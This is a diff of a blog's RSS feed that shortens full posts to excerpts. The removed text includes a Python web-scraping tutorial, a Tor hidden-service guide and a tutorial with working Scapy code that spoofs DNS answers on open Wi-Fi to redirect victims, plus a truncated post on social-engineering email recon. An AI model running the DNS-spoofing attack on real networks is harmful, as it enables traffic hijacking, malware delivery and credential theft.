@@ -7,7 +7,9 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Sat, 21 Feb 2015 00:00:00 +0000</lastBuildDate>
-    <atom:link href="https://jordan-wright.com/blog/tags/python/index.xml" rel="self" type="application/rss+xml" />
+    
+	<atom:link href="https://jordan-wright.com/blog/tags/python/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Web Scraping Hotel Prices for Fun and Savings</title>
@@ -15,123 +17,15 @@
       <pubDate>Sat, 21 Feb 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/web_scraping.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/web_scraping.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;During the process of planning a vacation, I came across a nice hotel I wanted to stay at. When looking at some possible dates, I noticed the nightly rate would fluctuate &lt;em&gt;dramatically&lt;/em&gt;. This made me question if I was going to wind up paying way more just because I wanted to stay at the hotel on a certain day.&lt;/p&gt;
 
-&lt;p&gt;Then I considered the alternative - maybe I could scrape the prices every day to find the cheapest nightly rate. Sounded like a job for Python, BeautifulSoup, and some whiskey.&lt;/p&gt;
-
-&lt;h3 id=&#34;a-brief-intro-to-python-web-scraping&#34;&gt;A Brief Intro to Python Web Scraping&lt;/h3&gt;
-
-&lt;p&gt;Web scraping with Python is generally done using a mixture of the fantastic &lt;code&gt;requests&lt;/code&gt; and &lt;code&gt;beautifulsoup&lt;/code&gt; libraries. This post won&amp;rsquo;t go into detail about all the neat features of &lt;code&gt;beautifulsoup&lt;/code&gt;, instead aiming for simplicity to show the basics.&lt;/p&gt;
-
-&lt;h4 id=&#34;getting-a-beautifulsoup-object&#34;&gt;Getting a BeautifulSoup Object&lt;/h4&gt;
-
-&lt;p&gt;The first step in web scraping is getting the HTML you want, and creating a parseable object out of it. We can do this by requesting a page with &lt;code&gt;requests.get()&lt;/code&gt; and, if successful, creating a BeautifulSoup object using the &lt;code&gt;BeautifulSoup()&lt;/code&gt; constructor with the &lt;code&gt;.text&lt;/code&gt; of our response.&lt;/p&gt;
-
-&lt;p&gt;It would look something like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;response = requests.get(&#39;http://foo.bar&#39;)
-if response.ok:
-    soup = BeautifulSoup(response.text)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h4 id=&#34;getting-data-from-beautifulsoup&#34;&gt;Getting Data From BeautifulSoup&lt;/h4&gt;
-
-&lt;p&gt;Now that we have a BeautifulSoup object, we can use its API to get the data we want. The first step is to parse out the &lt;code&gt;Tag&lt;/code&gt; object we are interested in. Then, we can parse out the text/attributes we want. Here are some examples of getting specific tags:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;soup.find_all(&#39;a&#39;) # Get all &amp;lt;a&amp;gt; tags
-soup.find_all(&#39;a&#39;, {&amp;quot;class&amp;quot; : &amp;quot;css_class&amp;quot;}) # Get all &amp;lt;a class=&amp;quot;css_class&amp;quot;&amp;gt; tags
-soup.find_all(&#39;a&#39;, &#39;css_class&#39;) # Shortcut for searching by class
-soup.find() # Same as find_all(), but returns the first instance
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;After we have the &lt;code&gt;Tag&lt;/code&gt; object we want, we can parse out the text by accessing the &lt;code&gt;.text&lt;/code&gt; attribute.&lt;/p&gt;
-
-&lt;p&gt;This is &lt;em&gt;barely&lt;/em&gt; scratching the surface of BeautifulSoup&amp;rsquo;s API, so if you&amp;rsquo;re interested in learning more, you can take a look at the docs &lt;a href=&#34;http://www.crummy.com/software/BeautifulSoup/bs4/doc/&#34;&gt;here&lt;/a&gt;. That&amp;rsquo;s all we&amp;rsquo;ll need for this post, so let&amp;rsquo;s see this in action.&lt;/p&gt;
-
-&lt;h3 id=&#34;parsing-some-not-great-html&#34;&gt;Parsing Some (Not Great) HTML&lt;/h3&gt;
-
-&lt;p&gt;The goal was to simply pull down the rate for each day, and dump it out to a CSV (&amp;ldquo;rates.csv&amp;rdquo;) for some sweet Excel graphing later.&lt;/p&gt;
-
-&lt;p&gt;I&amp;rsquo;ll leave the exact hotel and URL redacted, but the basic URL was in the form:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;http://foo.bar?month=:int&amp;amp;day=:int&amp;amp;year=:int
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We can start with a naive approach of looping through the months I was interested in (August through December) and getting a BeautifulSoup object from each result.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;import requests
-from bs4 import BeautifulSoup
-import time
-
-with open(&#39;rates.csv&#39;, &#39;w&#39;) as rates:
-    rates.write(&amp;quot;Date,Rate\n&amp;quot;)
-    for m in range(8,13):
-        for d in range(1,32):
-            try:
-                response = requests.get(&#39;http://foo.bar?month=&#39; + str(m) + &#39;&amp;amp;day=&#39; + str(d) + &#39;&amp;amp;year=2015&#39;)
-                if response.ok:
-                    soup = BeautifulSoup(response.text)
-            except Exception e:
-                print e
-            # Be (somewhat) nice.
-            time.sleep(.2)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now we just need to figure out what kind of data we care about. This site used tables. &lt;strong&gt;A lot.&lt;/strong&gt; After some testing, I wound up parsing HTML that looked like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&amp;lt;table summary=&amp;quot;rooms availability&amp;quot;&amp;gt;
-    &amp;lt;tbody&amp;gt;
-        &amp;lt;tr&amp;gt;
-            &amp;lt;td&amp;gt;
-                &amp;lt;div class=&amp;quot;roomSection&amp;quot;&amp;gt;
-                    &amp;lt;div class=&amp;quot;roomType&amp;quot;&amp;gt;
-                        &amp;lt;span class=&amp;quot;value&amp;quot;&amp;gt;King&amp;lt;/span&amp;gt;
-                    &amp;lt;/div&amp;gt;
-                    &amp;lt;div class=&amp;quot;roomAvail&amp;quot;&amp;gt;
-                        &amp;lt;div class=&amp;quot;bar&amp;quot;&amp;gt;
-                            &amp;lt;div class=&amp;quot;label&amp;quot;&amp;gt;Nightly Rate&amp;lt;/div&amp;gt;
-                            &amp;lt;div class=&amp;quot;value&amp;quot;&amp;gt;
-                                159.00 &amp;lt;-- What I want to get
-                            &amp;lt;/div&amp;gt;
-                        &amp;lt;/div&amp;gt;
-                    &amp;lt;/div&amp;gt;
-                &amp;lt;/div&amp;gt;
-            &amp;lt;/td&amp;gt;
-        &amp;lt;/tr&amp;gt;
-    &amp;lt;/tbody&amp;gt;
-&amp;lt;/table&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I cleaned up the formatting, removed unnecessary parts, etc. Trust me, you&amp;rsquo;re welcome.&lt;/p&gt;
-
-&lt;p&gt;My first step was to get the room type and make sure it was &amp;ldquo;King&amp;rdquo; as a sanity check, since there were multiple types of rooms in the table. Then, I wanted to get the text of the div with the class &amp;ldquo;value&amp;rdquo; in the &amp;ldquo;roomAvail&amp;rdquo; section. This is the nightly rate.&lt;/p&gt;
-
-&lt;p&gt;Finally, I want to write the rate out to the CSV file.&lt;/p&gt;
-
-&lt;p&gt;There&amp;rsquo;s definitely more concise ways of doing this with more advanced BeautifulSoup usage, but this code worked:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;king = soup.find(&amp;quot;table&amp;quot;, {&amp;quot;summary&amp;quot; : &amp;quot;rooms availability&amp;quot;}).find(&amp;quot;div&amp;quot;, &amp;quot;roomSection&amp;quot;)
-if king.find(&amp;quot;div&amp;quot;, &amp;quot;roomType&amp;quot;).text.strip() == &amp;quot;King&amp;quot;:
-    rate = king.find(&amp;quot;div&amp;quot;, &amp;quot;roomAvail&amp;quot;).find(&amp;quot;div&amp;quot;, &amp;quot;value&amp;quot;).strip()
-    rates.write(&amp;quot;2015-&amp;quot; + str(m) + &amp;quot;-&amp;quot; + str(d) + &amp;quot;,&amp;quot; + str(rate) + &amp;quot;\n&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;success&#34;&gt;Success!&lt;/h3&gt;
-
-&lt;p&gt;Running the script outputs the results just as I wanted them and, graphed in Excel, looks like this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/web scraping/rates.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Awesome.&lt;/em&gt; In just a few lines of Python, I was able to get data allowing me to plan a vacation while saving quite a bit of cash.&lt;/p&gt;
-</description>
+&lt;p&gt;Then I considered the alternative - maybe I could scrape the prices every day to find the cheapest nightly rate. Sounded like a job for Python, BeautifulSoup, and some whiskey.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -140,133 +34,15 @@ if king.find(&amp;quot;div&amp;quot;, &amp;quot;roomType&amp;quot;).text.strip()
       <pubDate>Mon, 06 Oct 2014 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2014/10/06/creating-tor-hidden-services-with-python/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/hidden_services.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/hidden_services.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;Tor is often used to protect the anonymity of someone who is trying to connect to a service. However, it is also possible to use Tor to protect the anonymity of a service provider via &lt;a href=&#34;https://www.torproject.org/docs/hidden-services.html.en&#34;&gt;&lt;strong&gt;&lt;em&gt;hidden services&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;. These services, operating under the &lt;code&gt;.onion&lt;/code&gt; TLD, allow publishers to anonymously create and host content viewable only by other Tor users.&lt;/p&gt;
 
-&lt;p&gt;The Tor project has &lt;a href=&#34;https://www.torproject.org/docs/tor-hidden-service.html.en&#34;&gt;instructions&lt;/a&gt; on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic &lt;code&gt;stem&lt;/code&gt; Python library to automatically create and host a Tor hidden service.&lt;/p&gt;
-
-&lt;h3 id=&#34;creating-hidden-services-manually&#34;&gt;Creating Hidden Services Manually&lt;/h3&gt;
-
-&lt;p&gt;The &lt;a href=&#34;https://www.torproject.org/docs/tor-hidden-service.html.en#two&#34;&gt;instructions provided by the Tor project&lt;/a&gt; show that creating hidden services simply involves setting up the service locally (such as a web server listening on localhost), and then setting a few configuration options to make the service available via Tor.&lt;/p&gt;
-
-&lt;p&gt;There are two configuration settings necessary to setup a hidden service: &lt;code&gt;HiddenServiceDir&lt;/code&gt;, the directory to store the &lt;code&gt;hostname&lt;/code&gt; and &lt;code&gt;private_key&lt;/code&gt; files, and &lt;code&gt;HiddenServicePort&lt;/code&gt;, the ports used to proxy hidden service connections.&lt;/p&gt;
-
-&lt;p&gt;As the instructions show, each hidden service requires a variation of the following two lines to be present in the &lt;code&gt;torrc&lt;/code&gt; configuration file (setting the directory, host, and ports appropriately):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;HiddenServiceDir /path/to/store/hidden_service/
-HiddenServicePort 80 127.0.0.1:5000
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;a-bit-about-the-tor-control-protocol&#34;&gt;A Bit About the Tor Control Protocol&lt;/h3&gt;
-
-&lt;p&gt;Changing the configuration file and restarting Tor everytime a change is needed can be a pain. Fortunately, Tor provides a way to dynamically change the running configuration using a simple text based protocol (similar to Telnet) called the Tor Control Protocol.&lt;/p&gt;
-
-&lt;p&gt;The &lt;a href=&#34;https://gitweb.torproject.org/torspec.git?a=blob_plain;hb=HEAD;f=control-spec.txt&#34;&gt;full specification&lt;/a&gt; of the protocol is available, however here is a quick example of getting the valid authentication methods:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ telnet localhost 9151
-PROTOCOLINFO
-
-250-PROTOCOLINFO 1
-250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE=&amp;quot;Tor\\control_auth_cookie&amp;quot;
-250-VERSION Tor=&amp;quot;0.2.4.24&amp;quot;
-250 OK
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Other examples using this extensive protocol can be found &lt;a href=&#34;https://www.thesprawl.org/research/tor-control-protocol/&#34;&gt;here&lt;/a&gt; or in the full protocol spec.&lt;/p&gt;
-
-&lt;h3 id=&#34;introducing-stem&#34;&gt;Introducing Stem&lt;/h3&gt;
-
-&lt;p&gt;To make interacting with the Tor control port both easier and programmatic, the Tor project maintains a fantastic Python library called &lt;a href=&#34;https://stem.torproject.org/&#34;&gt;Stem&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h4 id=&#34;stem-controller&#34;&gt;&lt;code&gt;stem.Controller&lt;/code&gt;&lt;/h4&gt;
-
-&lt;p&gt;Interaction with the Tor control port is performed using the &lt;code&gt;stem.Controller&lt;/code&gt; class. Creating an instance of the class involves connecting to the port and authenticating as follows:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;from stem.control import Controller
-controller = Controller.from_port(address=&amp;quot;127.0.0.1&amp;quot;, port=9151)
-try:
-    controller.authenticate(password=&amp;quot;&amp;quot;)
-except Exception as e:
-    print e
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now that we have a Controller, we can access the local configuration, pull the current descriptors for relays, and more.&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s use the Controller to automatically set the configuration settings we saw in the previous section. When set, these configuration options will cause Tor to create the two files, &lt;code&gt;hostname&lt;/code&gt; and &lt;code&gt;private_key&lt;/code&gt;, necessary to run the hidden service. Here is a short script that will setup a hidden service to listen on TCP port 80 and proxy all requests to an (already established) web server listening on &lt;a href=&#34;http://127.0.0.1:5000:&#34;&gt;http://127.0.0.1:5000:&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;host = &amp;quot;127.0.0.1&amp;quot;
-port = 5000
-hidden_svc_dir = &amp;quot;/tmp/hidden_service/&amp;quot;
-controller.set_options([
-    (&amp;quot;HiddenServiceDir&amp;quot;, hidden_svc_dir),
-    (&amp;quot;HiddenServicePort&amp;quot;, &amp;quot;80 %s:%s&amp;quot; % (host, str(port)))
-])
-svc_name = open(hidden_svc_dir + &amp;quot;/hostname&amp;quot;, &amp;quot;r&amp;quot;).read().strip()
-print &amp;quot;Created host: %s&amp;quot; % svc_name
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Easy as that! Now that we have the configuration setup, our service should be ready to go.&lt;/p&gt;
-
-&lt;h3 id=&#34;an-example-service&#34;&gt;An Example Service&lt;/h3&gt;
-
-&lt;p&gt;Now that we&amp;rsquo;ve seen a little about how Stem works, here&amp;rsquo;s an extremely basic example showing how the hidden service can be setup to work with a Flask application:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;from stem.control import Controller
-from flask import Flask
-
-if __name__ == &amp;quot;__main__&amp;quot;:
-
-    app = Flask(&amp;quot;example&amp;quot;)
-    port = 5000
-    host = &amp;quot;127.0.0.1&amp;quot;
-    hidden_svc_dir = &amp;quot;c:/temp/&amp;quot;
-
-    @app.route(&#39;/&#39;)
-    def index():
-        return &amp;quot;&amp;lt;h1&amp;gt;Tor works!&amp;lt;/h1&amp;gt;&amp;quot;
-    print &amp;quot; * Getting controller&amp;quot;
-    controller = Controller.from_port(address=&amp;quot;127.0.0.1&amp;quot;, port=9151)
-    try:
-        controller.authenticate(password=&amp;quot;&amp;quot;)
-        controller.set_options([
-            (&amp;quot;HiddenServiceDir&amp;quot;, hidden_svc_dir),
-            (&amp;quot;HiddenServicePort&amp;quot;, &amp;quot;80 %s:%s&amp;quot; % (host, str(port)))
-            ])
-        svc_name = open(hidden_svc_dir + &amp;quot;/hostname&amp;quot;, &amp;quot;r&amp;quot;).read().strip()
-        print &amp;quot; * Created host: %s&amp;quot; % svc_name
-    except Exception as e:
-        print e
-    app.run()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Here&amp;rsquo;s what this looks like in action:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;C:\&amp;gt;python tor_example.py
- * Getting controller
- * Created host: 4yrbax6gwnemqh7n.onion
- * Running on http://127.0.0.1:5000/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/hidden_services/screenshot.png&#34;/&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;caveats&#34;&gt;Caveats&lt;/h3&gt;
-
-&lt;p&gt;It is important to note that the security of the hidden service depends on protecting the location of the server. To do this, consider ways to prevent leaking the real server IP through debug messages, etc. There has been some &lt;a href=&#34;https://news.ycombinator.com/item?id=8404511&#34;&gt;great discussion&lt;/a&gt; on the topic that might be worth looking into.&lt;/p&gt;
-
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
-
-&lt;p&gt;Hidden services deliver freedom of speech and the free exchange of ideas without censorship. By using Stem Python library, it&amp;rsquo;s possible to take the pain out of manual configuration and instead programmatically create and manage multiple hidden services.&lt;/p&gt;
-
-&lt;p&gt;As always, let me know if you have any questions or comments.&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;The Tor project has &lt;a href=&#34;https://www.torproject.org/docs/tor-hidden-service.html.en&#34;&gt;instructions&lt;/a&gt; on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic &lt;code&gt;stem&lt;/code&gt; Python library to automatically create and host a Tor hidden service.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -275,133 +51,15 @@ if __name__ == &amp;quot;__main__&amp;quot;:
       <pubDate>Fri, 15 Nov 2013 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/wireless_python.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/wireless_python.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;A while back, I &lt;a href=&#34;http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html&#34;&gt;published a post&lt;/a&gt; on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the &lt;a href=&#34;http://www.aircrack-ng.org/&#34;&gt;aircrack suite&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.&lt;/p&gt;
-
-&lt;h3 id=&#34;the-dnspwn-attack&#34;&gt;The &amp;ldquo;Dnspwn Attack&amp;rdquo;&lt;/h3&gt;
-
-&lt;p&gt;The first attack we&amp;rsquo;ll explore is what I call the &amp;ldquo;dnspwn attack&amp;rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &amp;ldquo;&lt;a href=&#34;http://airpwn.sourceforge.net/Airpwn.html&#34;&gt;airpwn&lt;/a&gt;&amp;rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:&lt;/p&gt;
-
-&lt;p&gt;Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&amp;rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&amp;rsquo;s credentials.&lt;/p&gt;
-
-&lt;p&gt;To do this, she remembers that she can sniff all requests coming to and from Bob&amp;rsquo;s computer. She also knows that she is &lt;em&gt;closer&lt;/em&gt; to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server &lt;em&gt;before&lt;/em&gt; the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&amp;rsquo;s computer will likely ignore any further traffic received, including the real response!&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s see what this would look like:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/diagram.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/diagram_small.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;So, now that we know how the attack works, let&amp;rsquo;s automate it!&lt;/p&gt;
-
-&lt;h3 id=&#34;setting-up-the-alfa-awus06h&#34;&gt;Setting up the Alfa AWUS06H&lt;/h3&gt;
-
-&lt;p&gt;As was the case in my Raidersec post, we will be using the handy &lt;a href=&#34;http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8&#34;&gt;Alfa AWUS036H&lt;/a&gt; for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the &lt;code&gt;demo_insecure&lt;/code&gt; network.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;root@bt:~# airmon-ng start wlan0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now that we have monitor mode up and running on &lt;code&gt;mon0&lt;/code&gt;, let&amp;rsquo;s start coding!&lt;/p&gt;
-
-&lt;h3 id=&#34;coding-the-attack&#34;&gt;Coding the Attack&lt;/h3&gt;
-
-&lt;p&gt;We will utilize the &lt;code&gt;scapy&lt;/code&gt; module to perform the attack. Let&amp;rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called &lt;code&gt;send_response&lt;/code&gt; that we will make later:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;from scapy.all import *
-
-sniff(prn=lambda x: send_response(x),
-	lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now let&amp;rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;802.11 Frame - Change the &amp;ldquo;to-ds&amp;rdquo; flag to &amp;ldquo;from-ds&amp;rdquo; (our request will now be coming &lt;em&gt;from&lt;/em&gt; the access point)&lt;/li&gt;
-&lt;li&gt;802.11 Frame - Switch the source and destination MAC addresses&lt;/li&gt;
-&lt;li&gt;IP Layer - Switch the source and destination IP addresses&lt;/li&gt;
-&lt;li&gt;UDP layer - Switch the source and destination ports&lt;/li&gt;
-&lt;li&gt;DNS layer - Set the &amp;ldquo;answer&amp;rdquo; flag(s), and append our spoofed answer&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Fortunately, &lt;code&gt;scapy&lt;/code&gt; makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are &lt;em&gt;4&lt;/em&gt; MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&amp;rsquo;s the code:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;def send_response(x):
-	# Get the requested domain
-	req_domain = x[DNS].qd.qname
-	spoofed_ip = &#39;192.168.2.1&#39;
-	# Let&#39;s build our response from a copy of the original packet
-	response = x.copy()
-	# We need to start by changing our response to be &amp;quot;from-ds&amp;quot;, or from the access point.
-	response.FCfield = 2L
-	# Switch the MAC addresses
-	response.addr1, response.addr2 = x.addr2, x.addr1
-	# Switch the IP addresses
-	response.src, response.dst = x.dst, x.src
-	# Switch the ports
-	response.sport, response.dport = x.dport, x.sport
-	# Set the DNS flags
-	response[DNS].qr = 1L
-	response[DNS].ra = 1L
-	response[DNS].ancount = 1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now that we&amp;rsquo;ve set all the flags, let&amp;rsquo;s create and append the DNS answer:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;response[DNS].an = DNSRR(
-	rrname = req_domain,
-	type = &#39;A&#39;,
-	rclass = &#39;IN&#39;,
-	ttl = 900,
-	rdata = spoofed_ip
-	)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And, finally, we inject the spoofed response:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;sendp(response)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;That&amp;rsquo;s all there is to it! You can find the full source on &lt;a href=&#34;https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py&#34;&gt;Github&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&#34;demo&#34;&gt;Demo&lt;/h3&gt;
-
-&lt;p&gt;For the demo, I have the following HTML response available on the host 192.168.2.138:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
-&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-	Owned.
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It&amp;rsquo;s worth noticing that we can have &lt;em&gt;any&lt;/em&gt; HTML, Javascript, etc. we want. It would be trivial to hook the browser using the &lt;a href=&#34;http://beefproject.com/&#34;&gt;BeEF framework&lt;/a&gt;, for example.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s a screenshot of it in action (I am using my iPhone as the victim):&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png&#34;/&gt;&lt;/a&gt;
-&lt;a href=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/iphone.png&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/wireless-attacks/dnspwn/iphone_small.png&#34;/&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;conclusion-future-improvements&#34;&gt;Conclusion &amp;amp; Future Improvements&lt;/h3&gt;
-
-&lt;p&gt;It&amp;rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &amp;ldquo;airpwn&amp;rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Match requests against regular expressions (for example, only replacing Javascript content)&lt;/li&gt;
-&lt;li&gt;Set options from arguments / Read configuration information from a file&lt;/li&gt;
-&lt;li&gt;Implement the attack for other protocols (ie HTTP).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Enjoy!&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -410,9 +68,7 @@ sniff(prn=lambda x: send_response(x),
       <pubDate>Mon, 14 Oct 2013 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2013/10/14/automated-social-engineering-recon-using-rapportive/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/rapportive_small.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/rapportive_small.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
@@ -421,153 +77,7 @@ sniff(prn=lambda x: send_response(x),
 
 &lt;p&gt;During SE engagements, we often either run across email addresses (by, say, simply scraping the main website) or want to enumerate the email address structure in use by an organization (generating possible alternatives using tools like jigsaw.rb). It would be helpful if it were possible to automate the process of validating those email addresses by associating them to additional information or social networking profiles. This is where Rapportive comes in handy.&lt;/p&gt;
 
-&lt;h3 id=&#34;what-is-rapportive&#34;&gt;What is Rapportive?&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://rapportive.com/&#34;&gt;Rapporitve&lt;/a&gt;, acquired by Linkedin in February 2012, is an add-on for multiple browsers which embeds information about your contacts directly into Gmail. The extension sends your contact&amp;rsquo;s email address to the Rapportive server, which responds with known public information associated with the email address such as social networking profiles.&lt;/p&gt;
-
-&lt;h3 id=&#34;reverse-engineering-the-rapportive-extension&#34;&gt;Reverse Engineering the Rapportive Extension&lt;/h3&gt;
-
